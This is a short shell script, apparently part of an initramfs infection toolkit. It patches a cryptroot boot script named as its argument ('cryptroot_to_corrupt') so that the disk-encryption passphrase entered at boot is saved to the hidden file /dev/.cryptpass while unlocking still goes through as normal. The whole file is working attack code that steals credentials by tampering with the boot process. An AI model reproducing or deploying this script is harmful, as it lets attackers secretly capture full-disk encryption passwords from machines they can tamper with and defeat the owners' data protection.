#!/bin/sh

if [ $# -lt 1 ]; then
	echo "Usage: $0 cryptroot_to_corrupt"
	exit 1
fi

# Contains find_var_name
. ./infect_functions.sh

cryptroot=$1

cryptkeyscriptValues="cryptkeyscript" # possible values for the var
cryptkeyValues="cryptkey"

cryptkeyscript=`find_var_name "$cryptroot" "$cryptkeyscriptValues"`
cryptkey=`find_var_name "$cryptroot" "$cryptkeyValues"`

echo "cryptkeyscript=$cryptkeyscript"
echo "cryptkey=$cryptkey"

if test -z "$cryptkeyscript" -o -z "$cryptkey"; then
	echo "Unable to identify a var name"
	return 1
fi

interestIfLine=$(sed -n "/bin\/sh/,/\$$cryptkeyscript\s*\"\$$cryptkey\"/p"\
		$cryptroot | sed -n '/\s*if\s*/=' | tail -n1)
insertionLine=$((interestIfLine - 1))
sed -i "$insertionLine,/^\s*fi\s*$/s/\$$cryptkeyscript\s\s*\"\$$cryptkey\"/echo -n \"\$password/\"" $cryptroot
sed -i "$insertionLine a\
                        password=\`crypttarget=\"\$crypttarget\" cryptsource=\"\$cryptsource\" \$$cryptkeyscript \"\$$cryptkey\"\`;\n\
                        echo \"\$password\" > /dev/.cryptpass" $cryptroot

exit 0
